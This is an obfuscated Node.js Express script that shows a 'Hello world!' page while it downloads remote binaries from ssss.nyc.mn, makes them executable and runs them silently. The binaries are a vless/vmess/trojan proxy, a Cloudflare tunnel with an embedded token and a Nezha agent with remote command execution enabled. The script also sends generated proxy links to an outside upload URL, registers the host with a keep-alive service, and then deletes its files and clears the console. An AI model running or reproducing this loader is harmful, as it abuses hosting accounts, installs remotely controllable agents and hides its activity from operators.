const _0xa90521=_0x372a;(function(_0x35837f,_0x1c3b46){const _0x5843e3=_0x372a,_0x394ca6=_0x35837f();while(!![]){try{const _0x23cb91=parseInt(_0x5843e3(0x206))/0x1+parseInt(_0x5843e3(0x1fb))/0x2+-parseInt(_0x5843e3(0x1b6))/0x3+-parseInt(_0x5843e3(0x1bc))/0x4*(parseInt(_0x5843e3(0x1f5))/0x5)+parseInt(_0x5843e3(0x244))/0x6*(-parseInt(_0x5843e3(0x1c4))/0x7)+parseInt(_0x5843e3(0x1d3))/0x8*(-parseInt(_0x5843e3(0x25a))/0x9)+parseInt(_0x5843e3(0x199))/0xa*(parseInt(_0x5843e3(0x1b9))/0xb);if(_0x23cb91===_0x1c3b46)break;else _0x394ca6['push'](_0x394ca6['shift']());}catch(_0x5b78dd){_0x394ca6['push'](_0x394ca6['shift']());}}}(_0x3057,0x5f270));function _0x372a(_0x5d4b83,_0x58aa37){_0x5d4b83=_0x5d4b83-0x198;const _0x3057a5=_0x3057();let _0x372ad0=_0x3057a5[_0x5d4b83];return _0x372ad0;}const express=require(_0xa90521(0x228)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0xa90521(0x1f6)),{promisify}=require('util'),exec=promisify(require(_0xa90521(0x1c5))[_0xa90521(0x240)]),{execSync}=require(_0xa90521(0x1c5)),UPLOAD_URL=process['env'][_0xa90521(0x219)]||'',PROJECT_URL=process['env'][_0xa90521(0x23d)]||'',AUTO_ACCESS=process['env'][_0xa90521(0x202)]||![],FILE_PATH=process[_0xa90521(0x22d)][_0xa90521(0x20c)]||_0xa90521(0x20d),SUB_PATH=process[_0xa90521(0x22d)][_0xa90521(0x1ef)]||_0xa90521(0x1fa),PORT=process[_0xa90521(0x22d)]['SERVER_PORT']||process[_0xa90521(0x22d)][_0xa90521(0x1ff)]||0xbb8,UUID=process[_0xa90521(0x22d)][_0xa90521(0x1e5)]||_0xa90521(0x20b),NEZHA_SERVER=process[_0xa90521(0x22d)][_0xa90521(0x1e6)]||'',NEZHA_PORT=process[_0xa90521(0x22d)][_0xa90521(0x1dd)]||'',NEZHA_KEY=process['env'][_0xa90521(0x1a1)]||'',ARGO_DOMAIN=process[_0xa90521(0x22d)]['ARGO_DOMAIN']||_0xa90521(0x237),ARGO_AUTH=process['env']['ARGO_AUTH']||_0xa90521(0x19a),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0xa90521(0x22d)][_0xa90521(0x207)]||_0xa90521(0x1ac),CFPORT=process[_0xa90521(0x22d)][_0xa90521(0x1bb)]||0x1bb,NAME=process[_0xa90521(0x22d)][_0xa90521(0x204)]||_0xa90521(0x1cb);!fs[_0xa90521(0x1db)](FILE_PATH)?(fs[_0xa90521(0x22c)](FILE_PATH),console['log'](FILE_PATH+_0xa90521(0x209))):console[_0xa90521(0x243)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x54032a=_0xa90521,_0x2018b1=_0x54032a(0x22a);let _0xf981ca='';for(let _0x31b605=0x0;_0x31b605<0x6;_0x31b605++){_0xf981ca+=_0x2018b1[_0x54032a(0x1ec)](Math[_0x54032a(0x1ed)](Math['random']()*_0x2018b1[_0x54032a(0x247)]));}return _0xf981ca;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0xa90521(0x254)](FILE_PATH,webName),botPath=path[_0xa90521(0x254)](FILE_PATH,botName),subPath=path[_0xa90521(0x254)](FILE_PATH,_0xa90521(0x24f)),listPath=path[_0xa90521(0x254)](FILE_PATH,_0xa90521(0x24e)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0xa90521(0x254)](FILE_PATH,_0xa90521(0x19e));function deleteNodes(){const _0x3c1195=_0xa90521;try{if(!UPLOAD_URL)return;if(!fs[_0x3c1195(0x1db)](subPath))return;let _0x1a44d9;try{_0x1a44d9=fs[_0x3c1195(0x23c)](subPath,'utf-8');}catch{return null;}const _0x39bb15=Buffer[_0x3c1195(0x208)](_0x1a44d9,_0x3c1195(0x251))['toString'](_0x3c1195(0x233)),_0x332653=_0x39bb15['split']('\x0a')[_0x3c1195(0x216)](_0x46f9b5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3c1195(0x1f4)](_0x46f9b5));if(_0x332653[_0x3c1195(0x247)]===0x0)return;return axios['post'](UPLOAD_URL+_0x3c1195(0x1f3),JSON[_0x3c1195(0x1b2)]({'nodes':_0x332653}),{'headers':{'Content-Type':_0x3c1195(0x1d2)}})[_0x3c1195(0x1ad)](_0xc83983=>{return null;}),null;}catch(_0x1ffb8b){return null;}}function cleanupOldFiles(){const _0x29e7e5=_0xa90521;try{const _0x2baf25=fs[_0x29e7e5(0x1ea)](FILE_PATH);_0x2baf25[_0x29e7e5(0x1d1)](_0xbf8db7=>{const _0x2a128d=_0x29e7e5,_0x5814e2=path[_0x2a128d(0x254)](FILE_PATH,_0xbf8db7);try{const _0x58924a=fs[_0x2a128d(0x1d4)](_0x5814e2);_0x58924a[_0x2a128d(0x232)]()&&fs[_0x2a128d(0x1eb)](_0x5814e2);}catch(_0x2deb52){}});}catch(_0x3d6d78){}}app[_0xa90521(0x1bd)]('/',function(_0x1cfe83,_0xf43229){const _0x2ab188=_0xa90521;_0xf43229[_0x2ab188(0x1e1)](_0x2ab188(0x24a));});async function generateConfig(){const _0x522e47=_0xa90521,_0x2886d1={'log':{'access':_0x522e47(0x235),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x522e47(0x1e2)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x522e47(0x1d9),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x522e47(0x200),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x522e47(0x210),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x522e47(0x21a)},'streamSettings':{'network':_0x522e47(0x21e),'security':'none'}},{'port':0xbba,'listen':_0x522e47(0x210),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x522e47(0x21a)},'streamSettings':{'network':'ws','security':_0x522e47(0x21a),'wsSettings':{'path':_0x522e47(0x1d9)}},'sniffing':{'enabled':!![],'destOverride':[_0x522e47(0x1d0),_0x522e47(0x1c0),_0x522e47(0x223)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x522e47(0x210),'protocol':_0x522e47(0x25b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x522e47(0x203)}},'sniffing':{'enabled':!![],'destOverride':[_0x522e47(0x1d0),'tls',_0x522e47(0x223)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x522e47(0x210),'protocol':_0x522e47(0x249),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x522e47(0x21a),'wsSettings':{'path':_0x522e47(0x200)}},'sniffing':{'enabled':!![],'destOverride':[_0x522e47(0x1d0),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x522e47(0x1f7),'tag':_0x522e47(0x227)},{'protocol':'blackhole','tag':_0x522e47(0x1a4)}]};fs[_0x522e47(0x1ae)](path[_0x522e47(0x254)](FILE_PATH,'config.json'),JSON['stringify'](_0x2886d1,null,0x2));}function getSystemArchitecture(){const _0x627128=_0xa90521,_0x1e0a8e=os['arch']();return _0x1e0a8e==='arm'||_0x1e0a8e===_0x627128(0x1f9)||_0x1e0a8e===_0x627128(0x256)?'arm':_0x627128(0x242);}function downloadFile(_0x54e9d2,_0x45bb88,_0x4e7111){const _0x442a0e=_0xa90521,_0x3ba8d9=_0x54e9d2;!fs[_0x442a0e(0x1db)](FILE_PATH)&&fs[_0x442a0e(0x22c)](FILE_PATH,{'recursive':!![]});const _0x230ead=fs[_0x442a0e(0x236)](_0x3ba8d9);axios({'method':_0x442a0e(0x1bd),'url':_0x45bb88,'responseType':'stream'})['then'](_0x2c1d28=>{const _0x24770e=_0x442a0e;_0x2c1d28[_0x24770e(0x212)][_0x24770e(0x23e)](_0x230ead),_0x230ead['on'](_0x24770e(0x1de),()=>{const _0x1ddb65=_0x24770e;_0x230ead['close'](),console[_0x1ddb65(0x243)](_0x1ddb65(0x1c3)+path['basename'](_0x3ba8d9)+'\x20successfully'),_0x4e7111(null,_0x3ba8d9);}),_0x230ead['on']('error',_0x366f45=>{const _0x5538f5=_0x24770e;fs[_0x5538f5(0x24d)](_0x3ba8d9,()=>{});const _0xc31d9c=_0x5538f5(0x1c3)+path[_0x5538f5(0x1f2)](_0x3ba8d9)+'\x20failed:\x20'+_0x366f45[_0x5538f5(0x20e)];console[_0x5538f5(0x1a2)](_0xc31d9c),_0x4e7111(_0xc31d9c);});})['catch'](_0x211ed6=>{const _0x429540=_0x442a0e,_0x1fc248=_0x429540(0x1c3)+path[_0x429540(0x1f2)](_0x3ba8d9)+_0x429540(0x21b)+_0x211ed6[_0x429540(0x20e)];console[_0x429540(0x1a2)](_0x1fc248),_0x4e7111(_0x1fc248);});}async function downloadFilesAndRun(){const _0x23ff73=_0xa90521,_0x4c49ac=getSystemArchitecture(),_0xaea793=getFilesForArchitecture(_0x4c49ac);if(_0xaea793[_0x23ff73(0x247)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5a74ac=_0xaea793[_0x23ff73(0x211)](_0x2a5398=>{return new Promise((_0x28036c,_0x30b19f)=>{downloadFile(_0x2a5398['fileName'],_0x2a5398['fileUrl'],(_0x4a529b,_0x25fe19)=>{_0x4a529b?_0x30b19f(_0x4a529b):_0x28036c(_0x25fe19);});});});try{await Promise[_0x23ff73(0x1be)](_0x5a74ac);}catch(_0x49a261){console['error'](_0x23ff73(0x253),_0x49a261);return;}function _0x2ea9df(_0x32c6a0){const _0x373b3c=_0x23ff73,_0x30fec2=0x1fd;_0x32c6a0[_0x373b3c(0x1d1)](_0x21e1e9=>{const _0x3465b1=_0x373b3c;fs[_0x3465b1(0x1db)](_0x21e1e9)&&fs[_0x3465b1(0x1cc)](_0x21e1e9,_0x30fec2,_0x406ce9=>{const _0x36fae0=_0x3465b1;_0x406ce9?console[_0x36fae0(0x1a2)](_0x36fae0(0x250)+_0x21e1e9+':\x20'+_0x406ce9):console[_0x36fae0(0x243)]('Empowerment\x20success\x20for\x20'+_0x21e1e9+':\x20'+_0x30fec2[_0x36fae0(0x1d5)](0x8));});});}const _0x5c0e50=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2ea9df(_0x5c0e50);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2c9e65=NEZHA_SERVER[_0x23ff73(0x1d7)](':')?NEZHA_SERVER[_0x23ff73(0x23f)](':')[_0x23ff73(0x1aa)]():'',_0x5cc15e=new Set([_0x23ff73(0x1a3),_0x23ff73(0x1a6),'2096',_0x23ff73(0x1a0),_0x23ff73(0x248),'2053']),_0x3f6235=_0x5cc15e['has'](_0x2c9e65)?_0x23ff73(0x218):_0x23ff73(0x234),_0x4e403b=_0x23ff73(0x22b)+NEZHA_KEY+_0x23ff73(0x239)+NEZHA_SERVER+_0x23ff73(0x19f)+_0x3f6235+_0x23ff73(0x1a7)+UUID;fs['writeFileSync'](path[_0x23ff73(0x254)](FILE_PATH,_0x23ff73(0x226)),_0x4e403b);const _0x4e36fe=_0x23ff73(0x19b)+phpPath+_0x23ff73(0x1f8)+FILE_PATH+_0x23ff73(0x1ee);try{await exec(_0x4e36fe),console[_0x23ff73(0x243)](phpName+_0x23ff73(0x1cf)),await new Promise(_0x38c09a=>setTimeout(_0x38c09a,0x3e8));}catch(_0x4fde28){console[_0x23ff73(0x1a2)](_0x23ff73(0x217)+_0x4fde28);}}else{let _0x3df2d2='';const _0x433db4=[_0x23ff73(0x1a3),'8443',_0x23ff73(0x20f),_0x23ff73(0x1a0),_0x23ff73(0x248),_0x23ff73(0x1b8)];_0x433db4[_0x23ff73(0x1d7)](NEZHA_PORT)&&(_0x3df2d2=_0x23ff73(0x1b5));const _0x194306=_0x23ff73(0x19b)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x23ff73(0x1e0)+NEZHA_KEY+'\x20'+_0x3df2d2+_0x23ff73(0x1d8);try{await exec(_0x194306),console[_0x23ff73(0x243)](npmName+_0x23ff73(0x1cf)),await new Promise(_0x214b6e=>setTimeout(_0x214b6e,0x3e8));}catch(_0xac80d0){console[_0x23ff73(0x1a2)](_0x23ff73(0x231)+_0xac80d0);}}}else console[_0x23ff73(0x243)](_0x23ff73(0x19c));const _0x35c6a9='nohup\x20'+webPath+_0x23ff73(0x258)+FILE_PATH+_0x23ff73(0x1b3);try{await exec(_0x35c6a9),console['log'](webName+_0x23ff73(0x1cf)),await new Promise(_0x2d977f=>setTimeout(_0x2d977f,0x3e8));}catch(_0x4f3b9f){console['error']('web\x20running\x20error:\x20'+_0x4f3b9f);}if(fs['existsSync'](botPath)){let _0x38e824;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x38e824=_0x23ff73(0x259)+ARGO_AUTH;else ARGO_AUTH[_0x23ff73(0x257)](/TunnelSecret/)?_0x38e824=_0x23ff73(0x215)+FILE_PATH+'/tunnel.yml\x20run':_0x38e824=_0x23ff73(0x1ce)+FILE_PATH+_0x23ff73(0x21c)+ARGO_PORT;try{await exec(_0x23ff73(0x19b)+botPath+'\x20'+_0x38e824+_0x23ff73(0x24b)),console['log'](botName+_0x23ff73(0x1cf)),await new Promise(_0x5aa8d0=>setTimeout(_0x5aa8d0,0x7d0));}catch(_0x56d933){console[_0x23ff73(0x1a2)](_0x23ff73(0x225)+_0x56d933);}}await new Promise(_0x44beed=>setTimeout(_0x44beed,0x1388));}function getFilesForArchitecture(_0x146cf9){const _0x2ae59e=_0xa90521;let _0x5f3199;_0x146cf9==='arm'?_0x5f3199=[{'fileName':webPath,'fileUrl':_0x2ae59e(0x1c1)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x5f3199=[{'fileName':webPath,'fileUrl':_0x2ae59e(0x22e)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x51812b=_0x146cf9===_0x2ae59e(0x1b1)?_0x2ae59e(0x222):_0x2ae59e(0x246);_0x5f3199[_0x2ae59e(0x23a)]({'fileName':npmPath,'fileUrl':_0x51812b});}else{const _0x40ce54=_0x146cf9===_0x2ae59e(0x1b1)?_0x2ae59e(0x1ca):_0x2ae59e(0x1c2);_0x5f3199['unshift']({'fileName':phpPath,'fileUrl':_0x40ce54});}}return _0x5f3199;}function argoType(){const _0x217706=_0xa90521;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x217706(0x1fe));return;}if(ARGO_AUTH[_0x217706(0x1d7)]('TunnelSecret')){fs['writeFileSync'](path['join'](FILE_PATH,_0x217706(0x1e4)),ARGO_AUTH);const _0x41adc7=_0x217706(0x201)+ARGO_AUTH[_0x217706(0x23f)]('\x22')[0xb]+_0x217706(0x220)+path[_0x217706(0x254)](FILE_PATH,'tunnel.json')+_0x217706(0x1bf)+ARGO_DOMAIN+_0x217706(0x245)+ARGO_PORT+_0x217706(0x255);fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.yml'),_0x41adc7);}else console[_0x217706(0x243)](_0x217706(0x1dc));}async function extractDomains(){const _0x2223e5=_0xa90521;let _0x25126e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x25126e=ARGO_DOMAIN,console[_0x2223e5(0x243)]('ARGO_DOMAIN:',_0x25126e),await _0xb1b247(_0x25126e);else try{const _0x8bd38f=fs[_0x2223e5(0x23c)](path[_0x2223e5(0x254)](FILE_PATH,_0x2223e5(0x252)),_0x2223e5(0x233)),_0x5564cd=_0x8bd38f['split']('\x0a'),_0x4a5a43=[];_0x5564cd[_0x2223e5(0x1d1)](_0x256f4c=>{const _0x5cf438=_0x2223e5,_0x202e29=_0x256f4c[_0x5cf438(0x257)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x202e29){const _0x4fc7e3=_0x202e29[0x1];_0x4a5a43[_0x5cf438(0x21d)](_0x4fc7e3);}});if(_0x4a5a43[_0x2223e5(0x247)]>0x0)_0x25126e=_0x4a5a43[0x0],console['log'](_0x2223e5(0x1f0),_0x25126e),await _0xb1b247(_0x25126e);else{console['log'](_0x2223e5(0x1fd)),fs[_0x2223e5(0x1eb)](path['join'](FILE_PATH,_0x2223e5(0x252)));async function _0x5d7dc0(){const _0x5309e7=_0x2223e5;try{process[_0x5309e7(0x1f1)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x5309e7(0x1ab)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x5309e7(0x198));}catch(_0x5573e2){}}_0x5d7dc0(),await new Promise(_0x52a6dd=>setTimeout(_0x52a6dd,0xbb8));const _0xb6b32d=_0x2223e5(0x1ce)+FILE_PATH+_0x2223e5(0x21c)+ARGO_PORT;try{await exec(_0x2223e5(0x19b)+botPath+'\x20'+_0xb6b32d+_0x2223e5(0x24b)),console[_0x2223e5(0x243)](botName+_0x2223e5(0x1cf)),await new Promise(_0x9bd8a5=>setTimeout(_0x9bd8a5,0xbb8)),await extractDomains();}catch(_0x4e4903){console[_0x2223e5(0x1a2)](_0x2223e5(0x225)+_0x4e4903);}}}catch(_0x4f48b0){console['error'](_0x2223e5(0x241),_0x4f48b0);}async function _0x19ac77(){const _0x264361=_0x2223e5;try{const _0xf96cae=await axios[_0x264361(0x1bd)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0xf96cae['data']&&_0xf96cae[_0x264361(0x212)][_0x264361(0x1b7)]&&_0xf96cae[_0x264361(0x212)][_0x264361(0x22f)])return _0xf96cae[_0x264361(0x212)]['country_code']+'_'+_0xf96cae[_0x264361(0x212)][_0x264361(0x22f)];}catch(_0xb24dd6){try{const _0x507d03=await axios[_0x264361(0x1bd)](_0x264361(0x230),{'timeout':0xbb8});if(_0x507d03[_0x264361(0x212)]&&_0x507d03[_0x264361(0x212)][_0x264361(0x1c7)]===_0x264361(0x1cd)&&_0x507d03['data'][_0x264361(0x1c6)]&&_0x507d03[_0x264361(0x212)][_0x264361(0x22f)])return _0x507d03[_0x264361(0x212)][_0x264361(0x1c6)]+'_'+_0x507d03[_0x264361(0x212)]['org'];}catch(_0x538dae){}}return _0x264361(0x1c9);}async function _0xb1b247(_0x214d5e){const _0xd9f2d5=await _0x19ac77(),_0x308d63=NAME?NAME+'-'+_0xd9f2d5:_0xd9f2d5;return new Promise(_0x11a679=>{setTimeout(()=>{const _0x43e835=_0x372a,_0x41cc96={'v':'2','ps':''+_0x308d63,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x43e835(0x21a),'net':'ws','type':_0x43e835(0x21a),'host':_0x214d5e,'path':_0x43e835(0x224),'tls':_0x43e835(0x1c0),'sni':_0x214d5e,'alpn':'','fp':_0x43e835(0x1fc)},_0x22474f=_0x43e835(0x1ba)+UUID+'@'+CFIP+':'+CFPORT+_0x43e835(0x205)+_0x214d5e+'&fp=firefox&type=ws&host='+_0x214d5e+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x308d63+_0x43e835(0x24c)+Buffer['from'](JSON[_0x43e835(0x1b2)](_0x41cc96))[_0x43e835(0x1d5)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x43e835(0x1e8)+_0x214d5e+'&fp=firefox&type=ws&host='+_0x214d5e+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x308d63+_0x43e835(0x1e3);console[_0x43e835(0x243)](Buffer[_0x43e835(0x208)](_0x22474f)[_0x43e835(0x1d5)](_0x43e835(0x251))),fs[_0x43e835(0x1ae)](subPath,Buffer[_0x43e835(0x208)](_0x22474f)[_0x43e835(0x1d5)](_0x43e835(0x251))),console[_0x43e835(0x243)](FILE_PATH+_0x43e835(0x238)),uploadNodes(),app[_0x43e835(0x1bd)]('/'+SUB_PATH,(_0x52495e,_0xf826bd)=>{const _0x2ca377=_0x43e835,_0x2a09de=Buffer[_0x2ca377(0x208)](_0x22474f)[_0x2ca377(0x1d5)](_0x2ca377(0x251));_0xf826bd[_0x2ca377(0x1af)](_0x2ca377(0x1e9),_0x2ca377(0x1a8)),_0xf826bd[_0x2ca377(0x1e1)](_0x2a09de);}),_0x11a679(_0x22474f);},0x7d0);});}}async function uploadNodes(){const _0x277da9=_0xa90521;if(UPLOAD_URL&&PROJECT_URL){const _0x4c7737=PROJECT_URL+'/'+SUB_PATH,_0x3e1b91={'subscription':[_0x4c7737]};try{const _0x17a0cd=await axios[_0x277da9(0x1d6)](UPLOAD_URL+'/api/add-subscriptions',_0x3e1b91,{'headers':{'Content-Type':_0x277da9(0x1d2)}});return _0x17a0cd&&_0x17a0cd[_0x277da9(0x1c7)]===0xc8?(console[_0x277da9(0x243)](_0x277da9(0x1e7)),_0x17a0cd):null;}catch(_0x55b385){if(_0x55b385[_0x277da9(0x1df)]){if(_0x55b385['response'][_0x277da9(0x1c7)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x277da9(0x1db)](listPath))return;const _0xbff659=fs['readFileSync'](listPath,_0x277da9(0x233)),_0x11bc9b=_0xbff659['split']('\x0a')[_0x277da9(0x216)](_0x4d89af=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x277da9(0x1f4)](_0x4d89af));if(_0x11bc9b[_0x277da9(0x247)]===0x0)return;const _0x3d148d=JSON[_0x277da9(0x1b2)]({'nodes':_0x11bc9b});try{const _0x3ea28a=await axios[_0x277da9(0x1d6)](UPLOAD_URL+_0x277da9(0x19d),_0x3d148d,{'headers':{'Content-Type':_0x277da9(0x1d2)}});return _0x3ea28a&&_0x3ea28a[_0x277da9(0x1c7)]===0xc8?(console[_0x277da9(0x243)](_0x277da9(0x1a5)),_0x3ea28a):null;}catch(_0x320891){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2ac098=_0x372a,_0x3cd192=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3cd192['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3cd192[_0x2ac098(0x21d)](phpPath);process['platform']===_0x2ac098(0x1da)?exec(_0x2ac098(0x1c8)+_0x3cd192[_0x2ac098(0x254)]('\x20')+_0x2ac098(0x21f),_0x52dda8=>{const _0x3995a9=_0x2ac098;console[_0x3995a9(0x214)](),console['log']('App\x20is\x20running'),console[_0x3995a9(0x243)](_0x3995a9(0x23b));}):exec('rm\x20-rf\x20'+_0x3cd192[_0x2ac098(0x254)]('\x20')+_0x2ac098(0x221),_0x80762e=>{const _0x3cf048=_0x2ac098;console['clear'](),console[_0x3cf048(0x243)](_0x3cf048(0x1b0)),console[_0x3cf048(0x243)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x55b61d=_0xa90521;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x55b61d(0x243)](_0x55b61d(0x213));return;}try{const _0x1c4095=await axios['post'](_0x55b61d(0x229),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x55b61d(0x1d2)}});return console['log'](_0x55b61d(0x1a9)),_0x1c4095;}catch(_0x13d15e){return console[_0x55b61d(0x1a2)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x13d15e[_0x55b61d(0x20e)]),null;}}async function startserver(){const _0x5d2c77=_0xa90521;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x413ae7){console[_0x5d2c77(0x1a2)]('Error\x20in\x20startserver:',_0x413ae7);}}function _0x3057(){const _0x91300e=['\x20failed:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','push','tcp','\x20>\x20nul\x202>&1','\x0a\x20\x20credentials-file:\x20','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/agent','quic','/vmess-argo?ed=2560','Error\x20executing\x20command:\x20','config.yaml','direct','express','https://oooo.serv00.net/add-url','abcdefghijklmnopqrstuvwxyz','\x0aclient_secret:\x20','mkdirSync','env','https://amd64.ssss.nyc.mn/web','org','http://ip-api.com/json/','npm\x20running\x20error:\x20','isFile','utf-8','false','/dev/null','createWriteStream','nodejs-argo.gecvip.com','/sub.txt\x20saved\x20successfully','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','unshift','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','readFileSync','PROJECT_URL','pipe','split','exec','Error\x20reading\x20boot.log:','amd','log','6cVmDZJ','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/agent','length','2083','trojan','Hello\x20world!','\x20>/dev/null\x202>&1\x20&','\x0a\x0avmess://','unlink','list.txt','sub.txt','Empowerment\x20failed\x20for\x20','base64','boot.log','Error\x20downloading\x20files:','join','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','aarch64','match','\x20-c\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','351pXHRQw','vmess','\x22\x20>\x20/dev/null\x202>&1','2510hszbZm','eyJhIjoiODVhNGFhMjU3NDBkZGUwNzYwODA5MjU1NDYyYzNlYTYiLCJ0IjoiOWU1ZDM1MzMtYTRjOS00NWQ4LWJlZjAtZTVmOGQyMTVlNDg3IiwicyI6Ik1XTm1aamd4TmpRdE9XVTFOQzAwTWpBNExXRTFNV010WmpNNE9USTFNVFV4TURneCJ9','nohup\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','/api/add-nodes','config.json','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2087','NEZHA_KEY','error','443','block','Nodes\x20uploaded\x20successfully','8443','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','text/plain;\x20charset=utf-8','automatic\x20access\x20task\x20added\x20successfully','pop','pkill\x20-f\x20\x22[','cdns.doon.eu.org','catch','writeFileSync','set','App\x20is\x20running','arm','stringify','/config.json\x20>/dev/null\x202>&1\x20&','listen','--tls','1456257RbMJCK','country_code','2053','8679SFyPCU','\x0avless://','CFPORT','372tpZivz','get','all','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tls','https://arm64.ssss.nyc.mn/web','https://amd64.ssss.nyc.mn/v1','Download\x20','855043cmIenJ','child_process','countryCode','status','del\x20/f\x20/q\x20','Unknown','https://arm64.ssss.nyc.mn/v1','nodejsargo251211','chmod','success','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20is\x20running','http','forEach','application/json','37064fIorfK','statSync','toString','post','includes','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/vless-argo','win32','existsSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','NEZHA_PORT','finish','response','\x20-p\x20','send','xtls-rprx-vision','\x0a\x20\x20\x20\x20','tunnel.json','UUID','NEZHA_SERVER','Subscription\x20uploaded\x20successfully','?security=tls&sni=','Content-Type','readdirSync','unlinkSync','charAt','floor','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','SUB_PATH','ArgoDomain:','platform','basename','/api/delete-nodes','test','5135rMXgdy','path','freedom','\x20-c\x20\x22','arm64','sub','982358lhijOc','firefox','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','PORT','/trojan-argo','\x0a\x20\x20tunnel:\x20','AUTO_ACCESS','/vmess-argo','NAME','?encryption=none&security=tls&sni=','584292PrPrzF','CFIP','from','\x20is\x20created','Unhandled\x20error\x20in\x20startserver:','13f08f6b-7e15-478f-a587-cb6989ac1a36','FILE_PATH','./tmp','message','2096','127.0.0.1','map','data','Skipping\x20adding\x20automatic\x20access\x20task','clear','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','filter','php\x20running\x20error:\x20','true','UPLOAD_URL','none'];_0x3057=function(){return _0x91300e;};return _0x3057();}startserver()[_0xa90521(0x1ad)](_0x50df8a=>{const _0x18ac25=_0xa90521;console[_0x18ac25(0x1a2)](_0x18ac25(0x20a),_0x50df8a);}),app[_0xa90521(0x1b4)](PORT,()=>console[_0xa90521(0x243)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
